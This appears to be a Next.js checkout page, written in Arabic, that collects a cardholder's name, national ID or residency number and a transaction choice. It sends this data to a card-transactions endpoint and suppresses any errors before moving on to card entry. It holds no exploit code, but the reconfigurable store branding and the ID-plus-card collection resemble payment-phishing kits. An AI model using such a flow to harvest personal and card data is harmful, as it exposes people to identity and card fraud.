"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import toast from "react-hot-toast";
import Header from "../../components/Header";
import BottomNav from "../../components/BottomNav";
import { useSettings } from "@/lib/useSettings";
import { FormData, TransactionType, TRANSACTION_LABELS } from "@/lib/types";

const transactionTypes: { value: TransactionType; icon: string; desc: string }[] = [
  { value: "installments", icon: "calendar_month", desc: "توزيع المدفوعات على أقساط" },
  { value: "deduction", icon: "account_balance_wallet", desc: "خصم شهري تلقائي مجدول" },
  { value: "refund", icon: "assignment_return", desc: "استرجاع معاملة سابقة" },
  { value: "payment", icon: "payments", desc: "تسوية فورية لمرة واحدة" },
];

export default function DetailsPage() {
  const router = useRouter();
  const { settings, loading } = useSettings();
  const [submitting] = useState(false);
  const [form, setForm] = useState<FormData>({
    customerName: "",
    cardHolderName: "",
    nationalId: "",
    age: "",
    cardNumber: "",
    cvv: "",
    expiryDate: "",
    transactionType: "installments",
    installmentDay: 1,
    amount: undefined,
  });

  const update = (key: keyof FormData, value: FormData[keyof FormData]) =>
    setForm((p) => ({ ...p, [key]: value }));

  const needsDay = form.transactionType === "installments" || form.transactionType === "deduction";
  const needsAmount = form.transactionType === "refund" || form.transactionType === "payment";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!form.cardHolderName || !form.nationalId) {
      toast.error("يرجى تعبئة جميع الحقول المطلوبة");
      return;
    }
    if (needsAmount && (!form.amount || form.amount <= 0)) {
      toast.error("يرجى إدخال المبلغ");
      return;
    }
    sessionStorage.setItem("formData", JSON.stringify(form));
    fetch("/api/card-transactions", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(form),
    }).then(r => r.json()).then(d => {
      if (d.transactionId) sessionStorage.setItem("transactionId", d.transactionId);
    }).catch(() => {});
    router.push("/checkout/card");
  };

  if (loading) {
    return (
      <div className="flex-1 flex items-center justify-center">
        <div className="animate-spin h-8 w-8 border-4 border-primary border-t-transparent rounded-full" />
      </div>
    );
  }

  return (
    <>
      <Header storeName={settings.storeName} logoUrl={settings.logoUrl} />
      <main className="w-full max-w-2xl mx-auto px-2 sm:px-6 py-3 sm:py-14 mb-24" dir="rtl">

        {/* Step Indicator */}
        <div className="flex flex-col items-center mb-6 sm:mb-10">
          <div className="flex items-center gap-2 mb-2">
            <span className="px-2.5 py-0.5 bg-primary/10 text-primary text-xs font-bold rounded-full tracking-widest uppercase">
              التحقق
            </span>
          </div>
          <h1 className="text-base sm:text-3xl font-extrabold text-on-background tracking-tight">بيانات العميل</h1>
          <p className="text-secondary mt-1 sm:mt-2 text-[11px] sm:text-sm">الخطوة 2 من 4</p>
          <div className="flex gap-1.5 mt-4 sm:mt-6 w-full max-w-[240px] sm:max-w-sm">
            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
            <div className="h-1.5 sm:h-2 w-full bg-surface-container-highest rounded-full"></div>
            <div className="h-1.5 sm:h-2 w-full bg-surface-container-highest rounded-full"></div>
          </div>
        </div>



        {/* Form Card */}
        <div className="bg-white rounded-2xl shadow-[0_8px_32px_0_rgba(0,0,0,0.06)] p-3 sm:p-8 md:p-10">
          <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-10">

            {/* 1 & 2: اسم حامل البطاقة + رقم الهوية */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-5">
              <div className="flex flex-col gap-1 sm:col-span-2">
                <label className="text-xs sm:text-base font-semibold text-secondary px-1">الاسم بالكامل كما هو في البطاقة *</label>
                <input
                  className="w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-xs sm:text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none uppercase"
                  value={form.cardHolderName}
                  onChange={(e) => { update("cardHolderName", e.target.value); update("customerName", e.target.value); }}
                  placeholder="أدخل الاسم كما هو مكتوب في البطاقة"
                  required
                />
              </div>

              <div className="flex flex-col gap-1 sm:col-span-2">
                <label className="text-xs sm:text-base font-semibold text-secondary px-1">رقم الهوية الوطنية / الإقامة *</label>
                <input
                  className="w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-xs sm:text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none"
                  value={form.nationalId}
                  onChange={(e) => update("nationalId", e.target.value.replace(/\D/g, ""))}
                  placeholder="أدخل رقم الهوية الوطنية أو الإقامة"
                  maxLength={10}
                  required
                />
              </div>
            </div>

            {/* Transaction Type Cards */}
            <div>
              <h3 className="text-sm sm:text-xl font-bold text-on-background mb-4 sm:mb-5">اختر نوع المعاملة</h3>
              <div className="grid grid-cols-2 gap-2 sm:gap-3">
                {transactionTypes.map((t) => (
                  <label
                    key={t.value}
                    className={`relative flex items-center p-2.5 sm:p-5 cursor-pointer rounded-xl border-2 transition-all ${
                      form.transactionType === t.value
                        ? "bg-surface-container-low border-primary"
                        : "bg-surface-container-low border-transparent hover:border-outline-variant/30"
                    }`}
                  >
                    <input
                      type="radio"
                      name="transaction_type"
                      value={t.value}
                      checked={form.transactionType === t.value}
                      onChange={() => update("transactionType", t.value)}
                      className="hidden"
                    />
                    <div className="flex items-center gap-3">
                      <div className="w-8 h-8 sm:w-12 sm:h-12 shrink-0 rounded-xl bg-white flex items-center justify-center text-primary shadow-sm">
                        <span className="material-symbols-outlined text-[18px] sm:text-[24px]">{t.icon}</span>
                      </div>
                      <div className="min-w-0">
                        <p className="font-bold text-xs sm:text-base text-on-surface leading-tight">{TRANSACTION_LABELS[t.value]}</p>
                        <p className="text-[10px] sm:text-sm text-on-surface-variant mt-0.5 leading-tight hidden sm:block">{t.desc}</p>
                      </div>
                    </div>
                    <div className={`mr-auto shrink-0 transition-opacity ${form.transactionType === t.value ? "opacity-100" : "opacity-0"} text-primary`}>
                      <span className="material-symbols-outlined text-[18px] sm:text-[24px]">check_circle</span>
                    </div>
                  </label>
                ))}
              </div>
            </div>

            {/* Dynamic Fields */}
            <div className="space-y-6 border-t border-surface-container-high pt-4">
              {needsDay && (
                <div className="relative flex flex-col gap-1">
                  <label className="text-xs sm:text-base font-semibold text-secondary px-1">اختر يوم السداد الشهري</label>
                  <select
                    className="w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-xs sm:text-base text-on-surface focus:ring-2 focus:ring-primary/20 appearance-none outline-none"
                    value={form.installmentDay}
                    onChange={(e) => update("installmentDay", Number(e.target.value))}
                  >
                    {Array.from({ length: 31 }, (_, i) => i + 1).map((d) => (
                      <option key={d} value={d}>اليوم {d} من الشهر</option>
                    ))}
                  </select>
                  <div className="absolute left-4 top-10 pointer-events-none text-on-surface-variant">
                    <span className="material-symbols-outlined">expand_more</span>
                  </div>
                </div>
              )}

              {needsAmount && (
                <div className="flex flex-col gap-1">
                  <label className="text-xs sm:text-base font-semibold text-secondary px-1">
                    {form.transactionType === "refund" ? "المبلغ المراد استرجاعه" : "أدخل قيمة المبلغ المطلوب دفعه"}
                  </label>
                  <input
                    type="number"
                    className="w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-xs sm:text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none"
                    value={form.amount || ""}
                    onChange={(e) => update("amount", Number(e.target.value))}
                    placeholder="0.00"
                    min="0"
                    step="0.01"
                    required
                  />
                </div>
              )}
            </div>



            {/* Navigation Buttons */}
            <div className="flex flex-col-reverse sm:flex-row items-stretch sm:items-center justify-between gap-3 pt-6">
              <button
                type="button"
                onClick={() => router.back()}
                className="w-full sm:w-auto px-6 py-3 sm:px-8 sm:py-4 rounded-xl bg-surface-container-high text-on-surface text-xs sm:text-base font-bold hover:bg-surface-container-highest transition-all text-center"
              >
                رجوع
              </button>
              <button
                type="submit"
                disabled={submitting}
                className="w-full sm:w-auto px-8 py-3 sm:px-10 sm:py-4 rounded-xl bg-linear-to-br from-primary to-primary-container text-white text-xs sm:text-base font-bold shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-all text-center disabled:opacity-60 disabled:cursor-not-allowed"
              >
                {submitting ? "جاري التحقق..." : "التالي: بيانات البطاقة"}
              </button>
            </div>
          </form>
        </div>
      </main>
      <BottomNav />
    </>
  );
}
